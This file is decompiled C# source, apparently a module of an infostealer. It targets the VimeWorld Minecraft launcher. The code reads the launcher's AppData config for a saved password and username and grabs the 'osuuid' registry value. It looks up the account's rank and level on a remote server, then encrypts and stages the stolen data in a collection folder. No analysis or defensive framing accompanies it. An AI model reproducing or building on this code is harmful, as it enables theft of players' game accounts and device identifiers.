using System;
using System.IO;
using System.Net;
using System.Text;
using Microsoft.Win32;

internal class Class32
{
	public static string string_0 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.vimeworld", "config");

	public static string string_1;

	public static void smethod_0()
	{
		try
		{
			string string_ = Class38.string_11;
			if (!File.Exists(string_0))
			{
				return;
			}
			string text;
			using (StreamReader streamReader = new StreamReader(string_0))
			{
				text = streamReader.ReadToEnd();
			}
			if (text.Contains("password"))
			{
				string text2 = string_ + "\\VimeWorld";
				Directory.CreateDirectory(text2);
				if (Class73.bool_0)
				{
					string_1 = new WebClient().DownloadString(Class38.string_14 + smethod_4());
				}
				string path = Path.Combine(text2, (Class73.bool_0 ? (smethod_2() + smethod_1()) : "") + smethod_4());
				text = text + "||||" + smethod_3();
				text = Class28.smethod_0(text, Class73.string_1);
				using (StreamWriter streamWriter = new StreamWriter(path))
				{
					streamWriter.WriteLine(text);
				}
				Class36.int_9++;
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex?.ToString() + "Ошибка с Vime.Get");
		}
	}

	public static string smethod_1()
	{
		string text = string_1;
		int num = text.IndexOf("\"level\":");
		string text2 = text.Substring(num + 8);
		string text3 = text2[..text2.IndexOf(",")];
		return "[" + text3 + "]";
	}

	public static string smethod_2()
	{
		string text = string_1;
		int num = text.IndexOf("\"rank\":");
		string text2 = text.Substring(num + 8);
		string text3 = text2[..text2.IndexOf("\"")];
		return "[" + text3 + "]";
	}

	public static string smethod_3()
	{
		try
		{
			return Registry.CurrentUser.OpenSubKey("Software\\VimeWorld")!.GetValue("osuuid") as string;
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex?.ToString() + "Ошибка с OSSUID");
			return "Error";
		}
	}

	public static string smethod_4()
	{
		try
		{
			string text = "Error";
			StreamReader streamReader = new StreamReader(string_0, Encoding.Default);
			while (!streamReader.EndOfStream)
			{
				text = streamReader.ReadLine();
				if (text.StartsWith("username:"))
				{
					text = text.Substring(text.IndexOf(':') + 1);
					break;
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex?.ToString() + "ошибка NickName");
			return "Error";
		}
	}
}
